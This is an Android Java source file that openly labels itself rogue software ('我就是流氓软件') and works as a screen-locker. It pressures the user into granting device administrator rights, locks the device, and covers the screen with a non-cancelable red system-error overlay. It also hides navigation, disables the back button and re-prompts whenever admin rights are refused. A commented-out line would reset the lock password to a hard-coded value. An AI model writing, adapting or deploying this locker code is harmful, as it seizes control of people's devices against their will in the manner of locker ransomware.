package com.tan.lockScreen;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.AlertDialog;
import android.app.Dialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.Canvas;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.drawable.ColorDrawable;
import android.os.Build;
import android.os.Bundle;
import android.view.Gravity;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;

import com.tan.lockScreen.receiver.LockScreenReceiver;

public class MainActivity extends Activity {

    private WindowManager mWindowManager;
    private Window window;
    private DevicePolicyManager devicePolicyManager;
    private ComponentName componentName;
    private final int MY_REQUEST_CODE=999999;
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        window=getWindow();
        devicePolicyManager = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        componentName = new ComponentName(this, LockScreenReceiver.class);
        mWindowManager = (WindowManager) getApplicationContext().getSystemService(Context.WINDOW_SERVICE);
        activeManage();
    }
    public void lockScreen(){
        int w = WindowManager.LayoutParams.MATCH_PARENT;
        int h = WindowManager.LayoutParams.MATCH_PARENT;

        int flags = 0;
        int type = 0;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            type = WindowManager.LayoutParams.TYPE_TOAST;
        } else {
            type = WindowManager.LayoutParams.TYPE_PHONE;
        }
        View view=new View(getApplicationContext());
        view.setBackgroundColor(Color.RED);
        WindowManager.LayoutParams layoutParams = new WindowManager.LayoutParams(w, h, type, flags, PixelFormat.TRANSLUCENT);
        layoutParams.gravity = Gravity.TOP;
        mWindowManager.addView(view, layoutParams);
        if(Build.VERSION.SDK_INT == Build.VERSION_CODES.KITKAT){
            WindowManager.LayoutParams winParams = window.getAttributes();
            final int bits = WindowManager.LayoutParams.FLAG_TRANSLUCENT_STATUS;
            winParams.flags |= bits;
            window.setAttributes(winParams);
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            int flag = window.getDecorView().getSystemUiVisibility();
            flag |= (WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS| View.SYSTEM_UI_FLAG_LIGHT_STATUS_BAR);
            flag |= View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN | View.SYSTEM_UI_FLAG_LAYOUT_STABLE;
            window.getDecorView().setSystemUiVisibility(flag);
            window.setStatusBarColor(Color.TRANSPARENT);
            ColorDrawable drawable = new ColorDrawable(Color.BLUE);
            Bitmap bitmap = Bitmap.createBitmap(300,300,Bitmap.Config.ARGB_8888);
            Canvas canvas = new Canvas(bitmap);
            drawable.draw(canvas);
            ActivityManager.TaskDescription tDesc = new ActivityManager.TaskDescription("我就是流氓软件", bitmap, Color.RED);
            setTaskDescription(tDesc);
        }
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            window.setNavigationBarColor(Color.RED);
        }else{
            window.addFlags(WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
        }
        window.getDecorView().setSystemUiVisibility(View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION);

        View views=new View(getApplicationContext());
        views.setBackgroundColor(Color.RED);
        Dialog dialog = new AlertDialog.Builder(getApplicationContext(), R.style.Transparent)
                .setView(views)
                .create();

        Window window = dialog.getWindow();
        WindowManager.LayoutParams params = window.getAttributes();
        params.gravity = Gravity.BOTTOM;
        params.width = WindowManager.LayoutParams.MATCH_PARENT;
        params.height = WindowManager.LayoutParams.MATCH_PARENT;
        window.setAttributes(params);
        window.setType(WindowManager.LayoutParams.TYPE_SYSTEM_ERROR);
        dialog.setCancelable(false);
        dialog.show();
    }
    private void activeManage() {
        boolean isAdminActive = devicePolicyManager.isAdminActive(componentName);
        if(isAdminActive){
            devicePolicyManager.lockNow(); // 锁屏
            lockScreen();
//            devicePolicyManager.resetPassword("1993217", 0); // 设置锁屏密码
        }else{
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,"激活后才能使用锁屏功能");
            startActivityForResult(intent, MY_REQUEST_CODE);
        }
    }
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == MY_REQUEST_CODE && resultCode == Activity.RESULT_OK) {
            devicePolicyManager.lockNow();
        } else {
            activeManage();
            lockScreen();
        }
        super.onActivityResult(requestCode, resultCode, data);
    }
    public void onBackPressed() {}
}
